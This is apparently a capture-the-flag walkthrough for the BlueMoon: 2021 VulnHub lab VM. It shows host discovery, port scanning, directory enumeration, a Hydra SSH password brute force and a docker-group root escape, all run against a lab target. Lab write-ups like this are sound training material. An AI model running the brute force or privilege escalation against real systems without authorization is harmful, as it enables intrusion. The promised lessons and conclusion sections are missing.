# BlueMoon: 2021 VulnHub Walkthrough

![VulnHub](https://img.shields.io/badge/VulnHub-BlueMoon-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Beginner-green)
![Lab Type](https://img.shields.io/badge/Lab-Boot2Root-orange)

---

## Table of Contents

- [Overview](#overview)
- [Tools Used](#tools-used)
- [Step 1: Identify Attacker IP](#step-1-identify-attacker-ip)
- [Step 2: Discover Network Hosts](#step-2-discover-network-hosts)
- [Step 3: Port Scanning](#step-3-port-scanning)
- [Step 4: Web Enumeration](#step-4-web-enumeration)
- [Step 5: SSH Brute Force](#step-5-ssh-brute-force)
- [Step 6: Privilege Escalation](#step-6-privilege-escalation)
- [Step 7: Capture Root Flag](#step-7-capture-root-flag)
- [Attack Summary](#attack-summary)
- [Security Lessons](#security-lessons)
- [Conclusion](#conclusion)
- [Screenshots Folder Structure](#screenshots-folder-structure)

---

## Overview

This repository documents a penetration testing lab on **BlueMoon: 2021** VulnHub VM.  
Objective: discover vulnerabilities, exploit them, and obtain root access.

- Difficulty: Beginner  
- Platform: VulnHub  

---

## Tools Used

- Kali Linux
- Netdiscover
- Nmap
- Gobuster
- Dirb
- Hydra

---

## Step 1: Identify Attacker IP

Command:

```bash
ifconfig 

Result: 
Attacker IP: 192.168.0.75

Example result:

Attacker IP: 192.168.0.75

Screenshot:

screenshots/attacker-ip.png
Step 2: Discover Network Hosts

Command:

sudo netdiscover -r 192.168.0.0/24

Example result:

192.168.0.1      Zyxel Router
192.168.0.65     Target Machine

Victim machine:

192.168.0.65

Screenshot:

screenshots/netdiscover.png
Step 3: Port Scanning

Command:

sudo nmap -sV 192.168.0.65

Example result:

PORT     STATE SERVICE VERSION
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http

Screenshot:

screenshots/nmap-scan.png
Step 4: Web Enumeration

Gobuster command:

gobuster dir -u http://192.168.0.65 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

Example results:

/admin
/login
/uploads

Dirb command:

dirb http://192.168.0.65 /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

Screenshot:

screenshots/gobuster.png
screenshots/dirb.png
Step 5: SSH Brute Force

Command:

hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.65

Login after brute force:

ssh username@192.168.0.65

Screenshot:

screenshots/ssh-access.png
Step 6: Privilege Escalation

Check privileges:

id

Example:

uid=1000(user) gid=1000(user) groups=1000(user),999(docker)

Docker group exploit:

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

Screenshot:

screenshots/root-access.png
Step 7: Capture Root Flag
cd /root
ls
cat root.txt

Root access successfully obtained.

Attack Summary
Phase	Tool	Description
Reconnaissance	Netdiscover	Identify target machine
Scanning	Nmap	Discover open ports
Enumeration	Gobuster / Dirb	Find hidden directories
Exploitation	Hydra	Brute force SSH credentials
Privilege Escalation	Docker	Gain root access
Post Exploitation	Linux commands	Capture root flag
